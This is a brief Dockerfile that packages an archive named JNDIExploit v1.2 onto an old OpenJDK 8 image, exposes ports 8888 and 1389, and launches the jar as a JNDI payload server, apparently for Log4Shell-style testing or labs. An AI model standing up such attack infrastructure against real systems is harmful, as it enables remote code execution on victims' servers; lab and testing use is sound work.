FROM openjdk:8u181-jdk-alpine
EXPOSE 8888
EXPOSE 1389
RUN mkdir /app
WORKDIR /app

COPY JNDIExploit.v1.2.zip .
RUN unzip JNDIExploit.v1.2.zip
CMD ["java", "-jar", "/app/JNDIExploit-1.2-SNAPSHOT.jar", "-i", "jndi", "-p", "8888"]
